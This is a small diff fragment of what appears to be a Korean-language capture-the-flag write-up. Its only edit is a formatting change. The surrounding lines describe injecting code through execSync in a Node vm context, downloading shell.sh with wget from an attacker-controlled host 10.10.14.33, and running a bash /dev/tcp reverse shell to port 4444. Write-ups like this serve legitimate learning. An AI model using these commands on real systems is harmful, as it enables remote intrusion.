@@ -31,7 +31,7 @@ vm.run(code);
 ```
 - execSync('')안에 실행할 코드를 넣는다.
 - python3 -m http.server 80 실행 후 wget http://10.10.14.33:80/shell.sh 를 넣어 쉘을 다운로드 시킨다.
-<br>
+
 ### shell.sh에
 ### #!/bin/bash
 ### sh -i >& /dev/tcp/10.10.14.33/4444 0>&1 를 넣고 원격으로 실행 시킨다.
